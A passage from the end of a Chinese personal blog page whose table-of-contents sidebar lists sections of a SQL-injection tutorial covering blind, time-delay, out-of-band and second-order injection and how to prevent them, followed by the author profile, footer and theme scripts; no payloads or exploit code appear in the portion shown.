href="#%E9%80%9A%E8%BF%87%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6%E9%94%99%E8%AF%AF%E5%88%A9%E7%94%A8SQL%E7%9B%B2%E7%9B%AE%E6%B3%A8%E5%85%A5"><span class="nav-number">6.3.1.</span> <span class="nav-text">通过触发条件错误利用SQL盲目注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C10%EF%BC%9A%E5%B8%A6%E6%9D%A1%E4%BB%B6%E9%94%99%E8%AF%AF%E7%9A%84SQL%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">6.3.2.</span> <span class="nav-text">🧪实验10：带条件错误的SQL盲注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E8%AF%A6%E7%BB%86%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF%E6%8F%90%E5%8F%96%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE"><span class="nav-number">6.3.3.</span> <span class="nav-text">通过详细的SQL错误消息提取敏感数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C11%EF%BC%9A%E5%8F%AF%E8%A7%86%E7%9A%84%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">6.3.4.</span> <span class="nav-text">🧪实验11：可视的基于错误的SQL注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E8%A7%A6%E5%8F%91%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E6%9D%A5%E5%88%A9%E7%94%A8SQL%E7%9B%B2%E7%9B%AE%E6%B3%A8%E5%85%A5%EF%BC%88%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="nav-number">6.4.</span> <span class="nav-text">通过触发时间延迟来利用SQL盲目注入（延时盲注）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C12%EF%BC%9A%E5%B8%A6%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9A%84SQL%E7%9B%B2%E6%B3%A8%E5%85%A5%E5%92%8C%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2"><span class="nav-number">6.4.1.</span> <span class="nav-text">🧪实验12：带时间延迟的SQL盲注入和信息检索</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%B8%A6%E5%A4%96%EF%BC%88OAST%EF%BC%89%E6%8A%80%E6%9C%AF%E8%BF%9B%E8%A1%8CSQL%E7%9B%B2%E6%B3%A8%E5%85%A5%EF%BC%88%E5%B8%A6%E5%A4%96%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="nav-number">6.5.</span> <span class="nav-text">利用带外（OAST）技术进行SQL盲注入（带外盲注）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C13%EF%BC%9A%E5%B8%A6%E5%A4%96%E4%BA%A4%E4%BA%92%E7%9A%84SQL%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">6.5.1.</span> <span class="nav-text">🧪实验13：带外交互的SQL盲注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C14%EF%BC%9A%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE%E6%B8%97%E5%87%BA%E7%9A%84SQL%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">6.5.2.</span> <span class="nav-text">🧪实验14：带外数据渗出的SQL盲注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E5%90%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">7.</span> <span class="nav-text">不同上下文中的SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87XML%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">7.1.</span> <span class="nav-text">通过XML编码绕过过滤器的SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E9%98%B6SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">8.</span> <span class="nav-text">二阶SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">9.</span> <span class="nav-text">如何防止SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">10.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">yumlii33</p>
  <div class="site-description" itemprop="description">Molly's blog website.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">16</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/yumlii33" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yumlii33" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yumlii33</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">20k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">1:14</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":145,"height":315},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>
</html>
